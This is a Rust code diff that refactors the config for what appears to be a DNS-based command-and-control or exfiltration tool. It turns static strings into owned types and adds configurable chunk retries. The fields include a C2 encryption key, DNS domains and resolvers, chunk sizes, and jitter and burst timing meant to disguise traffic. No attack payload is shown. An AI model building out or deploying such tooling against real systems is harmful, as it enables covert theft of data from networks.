@@ -6,10 +6,10 @@ use crate::limits::max_supported_chunk_bytes;
 
 #[derive(Clone)]
 pub struct Config {
-    pub encryption_key: &'static str,
-    pub domains: &'static [&'static str],
-    pub resolvers: &'static [&'static str],
-    pub server_ip: &'static str,
+    pub encryption_key: String,
+    pub domains: Vec<String>,
+    pub resolvers: Vec<String>,
+    pub server_ip: String,
     pub chunk_bytes: usize,
     pub jitter_min_ms: u64,
     pub jitter_max_ms: u64,
@@ -31,13 +31,17 @@ struct FileConfig {
     jitter_max_ms: u64,
     chunks_per_burst: usize,
     burst_pause_ms: u64,
+    #[serde(default = "default_chunk_retry_attempts")]
+    chunk_retry_attempts: usize,
+    #[serde(default = "default_chunk_retry_delay_ms")]
+    chunk_retry_delay_ms: u64,
 }
 
 static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {
-    encryption_key: "MySecretC2Key123!@#DefaultChange",
-    domains: &["example.com"],
-    resolvers: &[],
-    server_ip: "0.0.0.0",
+    encryption_key: "MySecretC2Key123!@#DefaultChange".to_string(),
+    domains: vec!["example.com".to_string()],
+    resolvers: vec![],
+    server_ip: "0.0.0.0".to_string(),
     chunk_bytes: 180,
     jitter_min_ms: 1500,
     jitter_max_ms: 4000,
@@ -66,16 +70,16 @@ impl Config {
         cfg
     }
 
-    pub fn dns_domains(&self) -> &[&str] {
-        self.domains
+    pub fn dns_domains(&self) -> &[String] {
+        &self.domains
     }
 
-    pub fn resolver_endpoints(&self) -> &[&str] {
-        self.resolvers
+    pub fn resolver_endpoints(&self) -> &[String] {
+        &self.resolvers
     }
 
     pub fn server_ip(&self) -> &str {
-        self.server_ip
+        &self.server_ip
     }
 
     pub fn chunk_adjustment() -> Option<(usize, usize)> {
@@ -114,7 +118,7 @@ fn load_runtime_config() -> Option<Config> {
 }
 
 fn tune_chunk_bytes(mut cfg: Config) -> Config {
-    let max_allowed = max_supported_chunk_bytes(cfg.domains);
+    let max_allowed = max_supported_chunk_bytes(&cfg.domains);
     let original = cfg.chunk_bytes;
 
     if max_allowed == 0 {
@@ -136,28 +140,20 @@ fn tune_chunk_bytes(mut cfg: Config) -> Config {
     cfg
 }
 
-fn leak_vec(items: Vec<String>) -> &'static [&'static str] {
-    let leaked: Vec<&'static str> = items
-        .into_iter()
-        .map(|val| Box::leak(val.into_boxed_str()) as &'static str)
-        .collect();
-    Box::leak(leaked.into_boxed_slice())
-}
-
 impl From<FileConfig> for Config {
     fn from(value: FileConfig) -> Self {
         Config {
-            encryption_key: Box::leak(value.encryption_key.into_boxed_str()),
-            domains: leak_vec(value.domains),
-            resolvers: leak_vec(value.resolvers),
-            server_ip: Box::leak(value.server_ip.into_boxed_str()),
+            encryption_key: value.encryption_key,
+            domains: value.domains,
+            resolvers: value.resolvers,
+            server_ip: value.server_ip,
             chunk_bytes: value.chunk_bytes,
             jitter_min_ms: value.jitter_min_ms,
             jitter_max_ms: value.jitter_max_ms,
             chunks_per_burst: value.chunks_per_burst,
             burst_pause_ms: value.burst_pause_ms,
-            chunk_retry_attempts: default_chunk_retry_attempts(),
-            chunk_retry_delay_ms: default_chunk_retry_delay_ms(),
+            chunk_retry_attempts: value.chunk_retry_attempts,
+            chunk_retry_delay_ms: value.chunk_retry_delay_ms,
         }
     }
 }
